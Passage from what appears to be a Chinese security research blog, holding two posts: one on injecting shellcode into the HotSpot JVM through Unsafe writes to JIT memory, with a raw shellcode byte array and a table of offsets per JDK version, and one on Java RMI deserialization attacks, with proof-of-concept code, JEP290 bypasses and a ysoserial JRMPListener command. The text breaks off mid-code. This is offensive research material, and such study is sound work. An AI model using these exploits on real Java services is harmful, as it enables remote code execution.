\"yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi\"; Class clazz = new MyClassLoader().get(Base64.getDecoder().decode(classStr)); byte buf[] = new byte[]{ (byte) 0xFC, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0xE8, (byte) 0xC0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51, (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x48, (byte) 0x8B, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0F, (byte) 0xB7, (byte) 0x4A, (byte) 0x4A, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x3C, (byte) 0x61, (byte) 0x7C, (byte) 0x02, (byte) 0x2C, (byte) 0x20, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0xE2, (byte) 0xED, (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x8B, (byte) 0x42, (byte) 0x3C, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x8B, (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xC0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x50, (byte) 0x8B, (byte) 0x48, (byte) 0x18, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0xE3, (byte) 0x56, (byte) 0x48, (byte) 0xFF, (byte) 0xC9, (byte) 0x41, (byte) 0x8B, (byte) 0x34, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD6, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0x38, (byte) 0xE0, (byte) 0x75, (byte) 0xF1, (byte) 0x4C, (byte) 0x03, (byte) 0x4C, (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xD1, (byte) 0x75, (byte) 0xD8, (byte) 0x58, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x66, (byte) 0x41, (byte) 0x8B, (byte) 0x0C, (byte) 0x48, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x1C, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x8B, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5E, (byte) 0x59, (byte) 0x5A, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5A, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xFF, (byte) 0xE0, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5A, (byte) 0x48, (byte) 0x8B, (byte) 0x12, (byte) 0xE9, (byte) 0x57, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0x5D, (byte) 0x48, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8D, (byte) 0x8D, (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xBA, (byte) 0x31, (byte) 0x8B, (byte) 0x6F, (byte) 0x87, (byte) 0xFF, (byte) 0xD5, (byte) 0xBB, (byte) 0xF0, (byte) 0xB5, (byte) 0xA2, (byte) 0x56, (byte) 0x41, (byte) 0xBA, (byte) 0xA6, (byte) 0x95, (byte) 0xBD, (byte) 0x9D, (byte) 0xFF, (byte) 0xD5, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x3C, (byte) 0x06, (byte) 0x7C, (byte) 0x0A, (byte) 0x80, (byte) 0xFB, (byte) 0xE0, (byte) 0x75, (byte) 0x05, (byte) 0xBB, (byte) 0x47, (byte) 0x13, (byte) 0x72, (byte) 0x6F, (byte) 0x6A, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89, (byte) 0xDA, (byte) 0xFF, (byte) 0xD5 }; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byteArrayOutputStream.write(buf); byteArrayOutputStream.write(\"calc\\0\".getBytes()); byte[] result = byteArrayOutputStream.toByteArray(); Method method = clazz.getDeclaredMethod(\"run\", byte[].class); method.invoke(clazz, result); } catch (Exception e) { e.printStackTrace(); } } public static class MyClassLoader extends ClassLoader { public Class get(byte[] bytes) { return super.defineClass(bytes, 0, bytes.length); } }} 12345678910111213141516171819202122package sun.tools.attach;import java.io.IOException;public class WindowsVirtualMachine { public WindowsVirtualMachine() { } static native void enqueue(long var0, byte[] var2, String var3, String var4, Object... var5) throws IOException; static native long openProcess(int var0) throws IOException; public static void run(byte[] buf) { System.loadLibrary(\"attach\"); try { enqueue(-1L, buf, \"test\", \"test\"); } catch (Exception var2) { var2.printStackTrace(); } }} 基于oop偏移这种是基于@Ryan Wincey和@xxDark两位前辈的总结，基本原理是：多次调用某个方法，使其成为热点代码触发即时编译，然后通过oop的数据结构偏移计算出JIT地址，最后使用Unsafe写内存的功能，将shellcode写入到JIT地址。其中涉及Unsafe、Oop-Klass模型和即时编译这三个前置知识。 Unsafe类Unsafe类是java中非常特别的一个类，提供的操作可以直接读写内存、获得地址偏移值、锁定或释放线程。Unsafe只有一个私有的构造方法，但在类加载时候在静态代码中会实例化一个Unsafe对象，赋值给Unsafe类的静态常量Unsafe属性，我们反射获取到这个Unsafe属性即可。 123Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");field.setAccessible(true);Unsafe unsafe = (Unsafe) field.get(null); Unsafe读写内存的相关方法有getObject、getAddress、getInt、getLong和putByte等。 Oop-Klass模型HotSpot JVM 底层都是 C/C++ 实现的，Java 对象在JVM的表示模型叫做“OOP-Klass”模型，包括两部分： OOP，即 Ordinary Object Point，普通对象指针，用来描述对象实例信息。 Klass，用来描述 Java 类，包含了元数据和方法信息等。 在Java程序运行过程中，每创建一个新的对象，在JVM内部就会相应地创建一个对应类型的OOP对象。Java类是对象，Java方法也是对象，而Java类加载完成时在JVM中的最终产物就是InstanceKlass，其中包含方法信息、字段信息等一切java 类所定义的一切元素。 即时编译（JIT） 为了优化Java的性能 ，JVM在解释器之外引入了即时（Just In Time）编译器：当程序运行时，解释器首先发挥作用，代码可以直接执行；当方法或者代码块在一段时间内的调用次数超过了JVM设定的阈值时，这些字节码就会被编译成机器码，存入codeCache中。在下次执行时，再遇到这段代码，就会从codeCache中读取机器码，直接执行，以此来提升程序运行的性能。整体的执行过程大致如下图所示： Openjdk和Oracle JDK在默认mixed模式下会启动即时编译，即时编译的触发阈值在客户端编译器和服务端编译器上默认值分别为1500和10000。 原理分析在JVM的本体：jvm.dll和libjvm.so中，存在这一个VMStructs的类，存储了JVM中包括oop、klass、constantPool在内的数据结构和他的属性。其中有使用JNIEXPORT标记的VMStructs、VMTypes、IntConstants和LongConstants的入口、名称、地址等偏移的变量，借助ClassLoader的内部类NativeLibrary的find或findEntryNative方法（与JDK的版本有关）,可获取到这些变量的值。 然后通过InstanceKlass、Array&lt;Method*&gt;、Method、ConstMethod、ConstantPool、Symbol这些oop数据结构中的变量偏移计算出JIT的地址。 我们要计算出的目标JIT地址是目标方法的JIT地址，这需要目标方法经多次调用触发即时编译，并自动赋值_from_compiled_entry结构成员，然后对比方法名和Signature，从目标类众多默认方法中过滤出目标方法来，再通过Method加上_from_compiled_entry偏移计算出来。（这里的Signature即形如()V、(Ljava/lang/String;)V、()Ljava/lang/String;的方法签名） 上图没有提到InstanceKlass的获取，其实只要通过Target.class获取到目标类的类实例，再用Unsafe读取类实例加上java_lang_Class的klass偏移即可。 JVM的JIT在内存中是一个可读可写可执行的区域，最后使用Unsafe的putByte方法写入shellcode，再调用目标方法即可执行。这里要注意的是，如果使用没有恢复现场，即破坏了原有栈帧的shellcode，会导致JVM奔溃，切勿在生产环境上测试。 以上的Demo代码可以@xxDark的 JavaShellcodeInjector项目中浏览。 部分问题修复及改进在32位的JDK跑Demo，JRE会抛出个异常，调试发现从目标类实例获取InstanceKlass的偏移：klassOffset，从内存取到的值是0，使得获取到的klass不正确，导致Unsafe读取了一个异常的地址。 问题的原因目前还不得而知，但通过HSDB找到java.lang.Class的InstanceKlass就可以看到klass的偏移，后续其他自动获取的偏移也没有出现异常。 上面自动化地计算偏移，要加载JVM的链接库，还要获取一堆JVM里的数据结构、记录一堆oop和常量池的值，这要是想将POC写成一个文件着实有点不方便啊。那有没有一种简单粗暴的方法呢？ 答案是肯定的。笔者刚好装有多个版本的JDK，发现JDK大版本和位数相同的时候，上面那些偏移是不变的。翻看JDK的源码不难发现，这些offset归根结底是由offset_of宏得出，一个与C语言offsetof作用相同的宏，结果是一个结构成员相对于结构开头的字节偏移量。 而通过之前查阅的资料得知，不同JDK大版本之间的oop数据结构才存在差异，我们只要记录下这些相同架构和大版本的偏移，就能直接计算出JIT的地址，可以免去加载JVM链接库和收集、存储JVM里数据结构的操作。 以下是笔者收集的部分LTS版本JDK的oop相关偏移： 1234567891011121314151617181920212223242526272829303132333435363738// JDK8 x32static int klassOffset = 0x44;static int methodArrayOffset = 0xe4;static int methodsOffset = 0x4;static int constMethodOffset = 0x4;static int constantPoolTypeSize = 0x2c;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x1a;static int signatureIndexOffset = 0x1c;static int _from_compiled_entry = 0x24;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK8 x64static int klassOffset = 0x48;static int methodArrayOffset = 0x180;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x50;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x22;static int signatureIndexOffset = 0x24;static int _from_compiled_entry = 0x40;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK11 x64static int klassOffset = 0x50;static int methodArrayOffset = 0x198;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x40;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x2a;static int signatureIndexOffset = 0x2c;static int _from_compiled_entry = 0x38;static int symbolTypeBodyOffset = 0x6;static int symbolTypeLengthOffset = 0x0; 后记笔者在JDK7也曾尝试注入shellcode，但最后还是以失败告终，不仅是因为JDK7到JDK8的oop数据结构发生了很大的变化，而且JDK7中的类示例中并没有InstanceKlass结构成员，但java_lang_CLass中又确确实实存在_klass_offset这个结构成员，这点就比较奇怪。 翻看官方工具HSDB源码，发现它是通过BasicHashtable&lt;mtInternal&gt;的_buckets结构成员获取所有InstanceKlass的。由于JDK7上POC的oop数据结构需要改动较多，且还不知道BasicHashtable&lt;mtInternal&gt;要怎么获取，所以JDK7下的POC还未实现。 最后两个的shellcode注入方法基于Oracle JDK和Openjdk的默认JVM：HotSpot，其他一些的JVM的实现方法就要静待各位师傅发掘。 文中若有错误的地方，望各位师傅不吝斧正。 参考https://xz.aliyun.com/t/10075 https://www.slideshare.net/RyanWincey/java-shellcodeoffice https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java https://qiankunli.github.io/2014/10/27/jvm_classloader.html https://www.sczyh30.com/posts/Java/jvm-klass-oop/ https://jishuin.proginn.com/p/763bfbd58ef3 https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html","link":"/2022/03/22/JVM_Shellcode注入探索/"},{"title":"Java RMI攻击分析与总结","text":"RMI简介Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。它是由注册中心、服务端和客户端三部分组成。 注册中心 作为存储远程方法的代理对象的仓库。 服务端 暴露远程对象，并将其代理对象注册进 RMI Registry。一个代理对象在服务端中包含一个skeleton对象，用于接受来自stub对象的调用。 客户端 查找远程代理对象，远程调用服务对象。一个代理对象在调用该远程对象的客户端上包含一个stub对象，负责调用参数和返回值的序列化、打包解包，以及网络层的通讯过程。 攻击方式RMI的各种攻击方式本质上是利用对象传输过程中反序列化实现的，以下是几种常见的攻击方式。 攻击注册中心当服务端向注册中心注册时，注册中心会反序列化服务端绑定的对象，具体体现在sun.rmi.registry.RegistryImpl_Skel#dispatch。当服务端注册绑定的是一个恶意的对象时，就可造成反序列化漏洞。当然，由于绑定的对象需要时Remote对象，所以恶意对象需要实现使用代理类或改写注册方法才能注册绑定。 在远程方法实例化的过程中，调用的父类java.rmi.server.UnicastRemoteObject的构造方法，最终是调用了sun.rmi.server.Util#createProxy方法创建Remote的动态代理类对象并返回。 POC中的动态代理类按照createProxy方法中逻辑写即可，其中InvocationHandler子类通常选择sun.reflect.annotation.AnnotationInvocationHandler，它具有Map&lt;String, Object&gt;类型的属性memberValues可以很方便的绑定反序列化的恶意对象。 最终POC如下： 123456789101112131415Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"obj\", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1009);registry.bind(\"AttackRegistry\", remoteObj); 攻击服务端反序列化参数攻击服务端其中一种方法是通过反序列化远程方法参数实现的。服务端反序列化参数体现在sun.rmi.server.UnicastServerRef#dispatch方法里调用的unmarshalParameters方法，最终通过sun.rmi.server.UnicastRef#unmarshalValue方法反序列化非基本类型的参数。 1234567 protected static Object unmarshalValue(Class&lt;?&gt; var0, ObjectInput var1) throws IOException, ClassNotFoundException { if (var0.isPrimitive()) { ... } else { return var1.readObject(); }} 反序列化参数的利用POC比较简单，但需要服务端以Object未参数的远程方法，Demo如下： 123456789101112131415# 接口public interface IRemoteMethod extends Remote { public IRemoteMethod exploit(Object obj) throws RemoteException;}# 实现类public class RemoteMethod extends UnicastRemoteObject implements IRemoteMethod { protected RemoteMethod() throws RemoteException { } public IRemoteMethod exploit(Object obj) throws RemoteException { return null; }} 然后在客户端里放上同样的接口，从注册中心获取远程方法信息，并以恶意对象调用远程方法即可。 1234public static void main(String[] args) throws Exception { IRemoteMethod remoteMethod = (IRemoteMethod) new InitialContext().lookup(\"rmi://192.168.78.137:1009/RemoteMethod\"\"); remoteMethod.exploit(evilObject());} 对于非Object参数，但又是Object子类的远程方法，可以用动态代理或继承该子类的方法绕过。 攻击客户端反序列化注册绑定对象当客户端lookup时，也会从注册中心获取并反序列化注册绑定的对象，这时的反序列化是在存根sun.rmi.registry.RegistryImpl_Stub#lookup方法中进行。POC的构造也与注册中心反序列化的差不多，只是改成由注册中心注册绑定恶意类： 123456789101112131415Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"obj\", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);Registry registry = LocateRegistry.createRegistry(1009);registry.bind(\"AttackRegistry\", remoteObj); 反序列化返回值当远程方法的返回值不为空，且不为基础类型时，就会对返回值进行反序列化。反序列化返回值与服务端反序列化参数的调用栈类似，最终都是通过sun.rmi.server.UnicastRef#unmarshalValue方法反序列化。 POC也很简单，远程方法直接返回恶意对象即可： 123456public class AttackerRemoteMethod extends UnicastRemoteObject implements IAttackerRemoteMethod { public Object exploit() throws RemoteException { return evilObject(); }} JEP290及其绕过JEP290是JDK9引入的规范，并且向下兼容到JDK 8u121、JDK 7u131和JDK 6u141。其核心机制是由序列化客户端实现并设置在ObjectInputStream，在反序列化过程中调用过滤器接口方法来验证正在反序列化的类、正在创建的数组的大小以及反序列化的长度、深度和反序列化时引用的数量，返回REJECTED、ALLOWED或UNDECIDED状态。他的过滤接口方法并不是默认配置的，而是通过jdk.serialFilter属性设置全局过滤接口方法或setObjectInputFilter方法设置局部过滤接口方法。 在RMI反序列化过程中仅注册中心在sun.rmi.registry.RegistryImpl#registryFilter中实现，对反序列化的深度、数组大小和反序列化的类做了限制。 1234567891011121314151617181920212223private static Status registryFilter(FilterInfo var0) { if (registryFilter != null) { Status var1 = registryFilter.checkInput(var0); if (var1 != Status.UNDECIDED) { return var1; } } if (var0.depth() &gt; 20L) { return Status.REJECTED; } else { Class var2 = var0.serialClass(); if (var2 != null) { if (!var2.isArray()) { return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; } else { return var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; 1000000L ? Status.REJECTED : Status.UNDECIDED; } } else { return Status.UNDECIDED; } }} UnicastRef 类绕过UnicastRef 是RMI注册中心反序列化白名单中的类，是正常bind对象后注册中心得到的stub中的属性。 下面调试下正常的注册流程，直接在sun.rmi.registry.RegistryImpl_Skel#dispatch处，注册中心反序列化服务端bind对象开始。接着调用封装类的父类RemoteObject的自定义readObject方法。在这里会实例化Reference类UnicastRef，并调用他的readExternal反序列化。readExternal里接着调用sun.rmi.transport.LiveRef#read给UnicastRef的ref属性赋值。 123456read:291, LiveRef (sun.rmi.transport)readExternal:489, UnicastRef (sun.rmi.server)readObject:455, RemoteObject (java.rmi.server)...readObject:431, ObjectInputStream (java.io)dispatch:76, RegistryImpl_Skel (sun.rmi.registry) sun.rmi.transport.LiveRef#read方法里，主要逻辑是从输入流中获取TCPEndpoint和ObjID，来初始化LiveRef并返回。这里的TCPEndpoint记录着服务端监听的地址和端口，并且方法里保存LiveRef到输入流的操作会将TCPEndpoint保存到输入流的incomingRefTable属性中，这一步很关键。 反序列化结束后就是注册引用的流程。 在sun.rmi.transport.DGCImpl_Stub#dirty方法首先利用反序列化的UnicastRef建立连接，返回一个StreamRemoteCall对象，接着调用它的invoke方法。 invoke方法最后调用的是StreamRemoteCall对象的executeCall方法，通过getInputStream方法从conn属性获取输入流赋值给in属性，然后从输入流中获取一个字节赋给var1，进入switch语句中，为2则反序列化输入流。至此与UnicateRef绕过JEP290的流程就结束了。 12345678910111213141516171819202122232425262728public void executeCall() throws Exception { DGCAckHandler var2 = null; byte var1; try { ... this.getInputStream(); var1 = this.in.readByte(); this.in.readID(); } catch (UnmarshalException var11) { ... } switch(var1) { case 1: return; case 2: Object var14; try { var14 = this.in.readObject(); } catch (Exception var10) { throw new UnmarshalException(\"Error unmarshaling return\", var10); } ... } ...} 关于这个var1作用，查了AdoptOpenJDK的源码得知是JRMP协议中返回值的标记，正常返回值不会进行反序列化。UnicastRef绕过JEP290使用ysoserial中的JRMPlistener，其将报错返回改成反序列化的payload，实现命令执行。 最后服务端的代码如下，相比正常的流程可以控制LiveRef指向恶意的服务端ip和端口。 1234567891011121314public class UnicastRefBypass { public static void main(String[] args) throws Exception { Registry reg = LocateRegistry.getRegistry(\"localhost\", 1009); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\"10.91.33.139\", 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(UnicastRefBypass.class.getClassLoader(), new Class[]{ Registry.class }, obj); reg.bind(\"UnicastRefBypass\", proxy); }} UnicastRemoteObject类绕过在8u231的修复中，sun.rmi.transport.DGCImpl_Stub#dirty提前为输入流filter属性设置了过滤接口方法，在后续sun.rmi.transport.StreamRemoteCall#executeCall中又捕获过滤接口方法抛出的InvalidClassException异常，清空输入流中incomingRefTable属性的值。前者使得利用UnicastRef类绕过方式在反序列化Exception返回值时无法反序列化任意类。 国外安全研究员An Trinh在8u231版本发布前提出的一种绕过方式，没有使用注册流程中注册中心发起连接到服务端的输入流，而是利用注册中心在反序列化服务端绑定的对象过程中发起JRMP请求，巧妙地绕过了过滤。 先从直接反序列化构造的对象来复现下这个POC，首先用ysoserial起一个JRMPListener的exploit。 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 &quot;calc&quot; 然后再现在下面的POC反序列化。 123456789101112131415161718192021222324252627282930ObjID id = new ObjID(new Random().nextInt());TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 3333);UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance( RMIServerSocketFactory.class.getClassLoader(), new Class[]{RMIServerSocketFactory.class, Remote.class}, obj);Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);constructor.setAccessible(true);UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);Field field = UnicastRemoteObject.class.getDeclaredField(\"ssf\");field.setAccessible(true);field.set(unicastRemoteObject, serverSocketFactory);// Registry reg = LocateRegistry.getRegistry(\"localhost\", 1009);// reg.bind(\"Exploit\", unicastRemoteObject);ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);objectOutputStream.writeObject(unicastRemoteObject);byte[] result = byteArrayOutputStream.toByteArray();ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);objectInputStream.readObject(); 调用栈很长，先从java.rmi.server.UnicastRemoteObject#reexport方法开始。当csf或ssf属性非空时，会用csf和ssf实例化一个UnicastServerRef2对象，并调用UnicastServerRef2父类UnicastServerRef的exportObject方法。 UnicastServerRef的exportObject方法就是实现监听端口的操作。后续精彩的部分来了，监听端口的操作会调用sun.rmi.transport.tcp.TCPEndpoint#newServerSocket方法，其中会调用它的ssf属性的方法，这个ssf属性与前面UnicastRemoteObject对象的ssf属性一致，是封装RemoteObjectInvocationHandler的代理类对象。由于代理类的特性，会先调用RemoteObjectInvocationHandler类的invoke方法。再后面的调用栈与客户端调用远程方法的调用栈一致，也就是原本的注册中心变成了客户端，由于客户端没有启动JEP290设置，也就绕过了注册中心的JEP290限制。 单在实际注册绑定的过程中，构造的类会在RegistryImpl_Stub的bind方法中，序列化类的输出流ConnectionOutputStream的父类MarshalOutputStream的enableReplace属性永为true，代理类被替换为UnicastRef造成利用链被破坏，所以实际利用中要想办法将enableReplace值改为false。ysomap中有实现方法，感兴趣可有看一看。 trustURLCodebase绕过除了以上注册中心JEP290的限制之外，RMI中服务端对客户端的攻击：JNDI注入，使用rmi和ldap协议加载外部工厂类也先后受到trustURLCodebase的限制，只能从本地工厂类实例化对象。 本地工厂类绕过使用本地工厂类进行JNDI注入和RMI协议远程加载恶意类的JNDI注入开头的调用栈基本相似，毕竟两者都是基于RMI协议的，但在javax.naming.spi.NamingManager#getObjectInstance这里开始就有所不同。在调用getObjectFactoryFromReference方法时返回的是本地正常的工厂类，这个工厂类是ObjectFactory的实现类或他的子类，然后调用工厂类的getObjectInstance方法。 现在比较通用的ObjectFactory实现类是BeanFactory，他的getObjectInstance方法会从ResourceRef对象的className属性获取类名并实例化，然后从forceString的String引用地址以=号分割获取参数名和setter方法名，并反射获取这个setter参数为String的方法，最后获取参数名的String引用地址内内容，用实例化的对象调用这个setter方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws NamingException { if (obj instanceof ResourceRef) { try { Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) { try { beanClass = tcl.loadClass(beanClassName); } catch(ClassNotFoundException e) { } } else { try { beanClass = Class.forName(beanClassName); } catch(ClassNotFoundException e) { e.printStackTrace(); } } if (beanClass == null) { throw new NamingException (\"Class not found: \" + beanClassName); } ... Object bean = beanClass.getConstructor().newInstance(); /* Look for properties with explicitly configured setter */ RefAddr ra = ref.get(\"forceString\"); Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;(); String value; if (ra != null) { value = (String)ra.getContent(); Class&lt;?&gt; paramTypes[] = new Class[1]; paramTypes[0] = String.class; String setterName; int index; /* Items are given as comma separated list */ for (String param: value.split(\",\")) { param = param.trim(); /* A single item can either be of the form name=method * or just a property name (and we will use a standard * setter) */ index = param.indexOf('='); if (index &gt;= 0) { setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); } else { ... } try { forced.put(param, beanClass.getMethod(setterName, paramTypes)); } catch (NoSuchMethodException|SecurityException ex) { ... } } } Enumeration&lt;RefAddr&gt; e = ref.getAll(); while (e.hasMoreElements()) { ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) { continue; } value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) { valueArray[0] = value; try { method.invoke(bean, valueArray); } catch (...) { ... } continue; } ... } return bean; } catch (java.beans.IntrospectionException ie) { ... } } else { return null; }} 结合以上getObjectInstance代码逻辑，被反射的类需要符合以下条件才可被利用: 具有一个无参公有构造方法 具有一个公有、参数为String类型的方法 一些使用了tomcat-embed-el依赖的项目，或者部分tomcat和spring的版本下具有的javax.el.ELProcessor类和他的eval方法符合这些条件，最终构造出用于绑定的Remote对象如下： 1234ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String) null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String) null);resourceRef.add(new StringRefAddr(\"forceString\", \"a=eval\"));resourceRef.add(new 